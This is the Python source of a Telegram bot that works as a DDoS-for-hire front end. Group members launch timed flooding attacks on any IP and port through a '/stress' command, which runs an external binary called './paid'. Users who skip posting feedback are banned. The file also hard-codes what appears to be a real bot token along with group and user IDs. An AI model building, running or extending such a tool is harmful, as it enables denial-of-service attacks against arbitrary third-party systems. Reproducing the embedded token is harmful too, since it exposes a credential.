import subprocess
import asyncio
import logging
import time
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
)
from telegram.error import TelegramError

# Logging configuration
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)

# ========== CONFIGURATION ==========
BOT_TOKEN = "8047907032:AAFuLcC0lNrarOC1s6c0jmIUyvYT8xLFkQw"
GROUP_OWNER_ID = 5712886230         # Replace with your Telegram ID
ALLOWED_GROUP_ID = -1002204038475   # Replace with your group's ID
DEFAULT_TIME = 180                  # Default attack duration (seconds) for non-admin users
MAX_CONCURRENT = 3                 # Maximum simultaneous attacks

DEFAULT_FEEDBACK_WINDOW = 300      # Default time (in seconds) to wait for feedback (5 minutes)
DEFAULT_BAN_DURATION = 120        # Default ban duration (in seconds) (30 minutes)

# ========== GLOBAL VARIABLES ==========
custom_time = DEFAULT_TIME
feedback_window = DEFAULT_FEEDBACK_WINDOW
ban_duration = DEFAULT_BAN_DURATION

active_attacks = {}    # Key: (user_id, process.pid), Value: process instance
pending_feedback = {}  # Key: user_id, Value: list of asyncio.Task objects waiting for feedback
banned_users = {}      # Key: user_id, Value: ban expiry timestamp (from time.time())

lock = asyncio.Lock()  # Asyncio lock for synchronizing access to our dictionaries

bot_name = None  # This will be fetched from the Telegram API

# ========== HELPER FUNCTIONS ==========

def is_allowed_group(update: Update) -> bool:
    """Verify that the command is coming from the allowed group."""
    return update.effective_chat and update.effective_chat.id == ALLOWED_GROUP_ID

async def is_group_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Check if the current user is an admin or creator of the group."""
    try:
        chat_member = await context.bot.get_chat_member(ALLOWED_GROUP_ID, update.effective_user.id)
        return chat_member.status in ["administrator", "creator"]
    except TelegramError:
        return False

def is_banned(user_id: int) -> bool:
    """Determine if a user is currently banned."""
    now = time.time()
    if user_id in banned_users:
        if banned_users[user_id] > now:
            return True
        else:
            del banned_users[user_id]
    return False

# ========== COMMAND HANDLERS ==========

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command: Show a modern inline-keyboard menu with attack options."""
    if not is_allowed_group(update):
        return
    if is_banned(update.effective_user.id):
        await update.message.reply_text("🚫 You are currently banned from using this bot, REASON : FEEDBACK SS NOT SENDED.")
        return

    keyboard = [
        [
            InlineKeyboardButton("🚀 Attack", callback_data="attack_menu"),
            InlineKeyboardButton("🛑 Cancel", callback_data="cancel_menu"),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    name = bot_name if bot_name else "Attack Bot"
    await update.message.reply_text(
        f"🤖 *{name} attack bot* 🤖\nChoose an option below to continue...",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
    )

async def set_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner command to set the default attack time."""
    global custom_time
    if not is_allowed_group(update):
        return
    if update.effective_user.id != GROUP_OWNER_ID:
        await update.message.reply_text("❌ Only the group owner can set the time.")
        return
    try:
        custom_time = int(context.args[0])
        await update.message.reply_text(f"✅ Default attack time set to {custom_time} seconds.")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /settime <seconds>")

async def set_feedback_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner command to set the feedback window time (in seconds)."""
    global feedback_window
    if not is_allowed_group(update):
        return
    if update.effective_user.id != GROUP_OWNER_ID:
        await update.message.reply_text("❌ Only the group owner can set the feedback time.")
        return
    try:
        feedback_window = int(context.args[0])
        await update.message.reply_text(f"✅ Feedback window set to {feedback_window} seconds.")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /setfeedbacktime <seconds>")

async def set_ban_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner command to set the ban duration (in seconds)."""
    global ban_duration
    if not is_allowed_group(update):
        return
    if update.effective_user.id != GROUP_OWNER_ID:
        await update.message.reply_text("❌ Only the group owner can set the ban time.")
        return
    try:
        ban_duration = int(context.args[0])
        await update.message.reply_text(f"✅ Ban duration set to {ban_duration} seconds.")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /setbantime <seconds>")

async def manage_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, ip: str, port: str, attack_time: int, is_admin: bool):
    """
    Launch an attack, wait for it to finish, and if the user is not an admin,
    prompt for feedback.
    """
    user_id = update.effective_user.id
    async with lock:
        if len(active_attacks) >= MAX_CONCURRENT:
            await update.message.reply_text("⚠️ Two attacks are already running. Please wait.")
            return
        command = f"./paid {ip} {port} {attack_time}"
        try:
            process = subprocess.Popen(command.split())
        except Exception as e:
            await update.message.reply_text(f"❌ Failed to start attack: {e}")
            return
        active_attacks[(user_id, process.pid)] = process

    await update.message.reply_text(
        f"🚀 Attack started on {ip}:{port} for {attack_time} seconds!\n(Slot {len(active_attacks)}/{MAX_CONCURRENT})"
    )

    # Wait for the attack to finish
    await asyncio.sleep(attack_time)

    async with lock:
        active_attacks.pop((user_id, process.pid), None)

    await update.message.reply_text(f"✅ Attack on {ip}:{port} ended.")

    # Non-admin users must provide feedback after an attack.
    if not is_admin:
        chat_id = update.effective_chat.id
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"👤 @{update.effective_user.username}, please provide your feedback using:\n"
                f"`/feedback <your feedback>`\n"
                f"within {feedback_window} seconds, or you'll be banned for {ban_duration} seconds."
            ),
            parse_mode=ParseMode.MARKDOWN,
        )
        # Schedule the feedback timeout task.
        task = asyncio.create_task(feedback_timeout(context, chat_id, user_id))
        async with lock:
            pending_feedback.setdefault(user_id, []).append(task)

async def feedback_timeout(context: ContextTypes.DEFAULT_TYPE, chat_id: int, user_id: int):
    """
    Await the feedback period; if no feedback is submitted, ban the user.
    """
    try:
        await asyncio.sleep(feedback_window)
        async with lock:
            # If there is any pending feedback task for this user, ban them.
            if user_id in pending_feedback and pending_feedback[user_id]:
                pending_feedback.pop(user_id, None)
                banned_users[user_id] = time.time() + ban_duration
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"🚫 You did not provide feedback in time and have been banned for {ban_duration} seconds."
        )
    except asyncio.CancelledError:
        # Feedback was provided in time
        return

async def stress(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /attack command to start an attack."""
    if not is_allowed_group(update):
        return
    user_id = update.effective_user.id
    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned from using this bot.")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /attack <ip> <port> [time if admin]")
        return

    ip = context.args[0]
    port = context.args[1]
    is_admin_flag = await is_group_admin(update, context)
    if is_admin_flag and len(context.args) >= 3:
        try:
            attack_time = int(context.args[2])
        except ValueError:
            await update.message.reply_text("Time must be an integer.")
            return
    else:
        attack_time = custom_time

    # Launch the attack as an asyncio task.
    asyncio.create_task(manage_attack(update, context, ip, port, attack_time, is_admin_flag))

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel all active attacks launched by the user."""
    if not is_allowed_group(update):
        return
    user_id = update.effective_user.id
    cancelled = False
    async with lock:
        keys = [key for key in active_attacks if key[0] == user_id]
        for key in keys:
            proc = active_attacks.pop(key)
            proc.kill()
            cancelled = True
    if cancelled:
        await update.message.reply_text("✅ Your running attack(s) have been cancelled.")
    else:
        await update.message.reply_text("ℹ️ You have no running attacks to cancel.")

async def feedback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Allow a user to submit feedback to cancel a pending feedback timeout."""
    if not is_allowed_group(update):
        return
    user_id = update.effective_user.id
    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned from using this bot.")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /feedback <your feedback>")
        return

    # Here, any valid feedback submission cancels one pending feedback task.
    async with lock:
        if user_id in pending_feedback and pending_feedback[user_id]:
            task = pending_feedback[user_id].pop(0)
            task.cancel()
            await update.message.reply_text("✅ Thank you for your feedback!")
        else:
            await update.message.reply_text("ℹ️ No pending feedback request found.")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline keyboard button callbacks."""
    query = update.callback_query
    await query.answer()
    if query.data == "attack_menu":
        instructions = (
            "👉 *Attack Mode Selected*\n"
            "To initiate an attack, use the command:\n"
            "`/stress <ip> <port> [time]`"
        )
        await query.edit_message_text(text=instructions, parse_mode=ParseMode.MARKDOWN)
    elif query.data == "cancel_menu":
        await cancel(update, context)
        await query.edit_message_text(text="🛑 Attack cancellation initiated.", parse_mode=ParseMode.MARKDOWN)
    else:
        await query.edit_message_text(text="❓ Unknown action.", parse_mode=ParseMode.MARKDOWN)

# ========== RUN BOT ==========
async def main():
    global bot_name
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Fetch and cache the bot's name from Telegram.
    try:
        bot_info = await app.bot.get_me()
        bot_name = bot_info.first_name
    except Exception as e:
        logging.error(f"Failed to fetch bot info: {e}")
        bot_name = "Attack Bot"

    # Register command handlers.
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("settime", set_time))
    app.add_handler(CommandHandler("setfeedbacktime", set_feedback_time))
    app.add_handler(CommandHandler("setbantime", set_ban_time))
    app.add_handler(CommandHandler("stress", stress))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CommandHandler("feedback", feedback))
    app.add_handler(CallbackQueryHandler(button_handler))

    print(f"{bot_name} running with modern UI and max concurrent attacks = {MAX_CONCURRENT}")
    await app.run_polling()

if __name__ == "__main__":
    asyncio.run(main())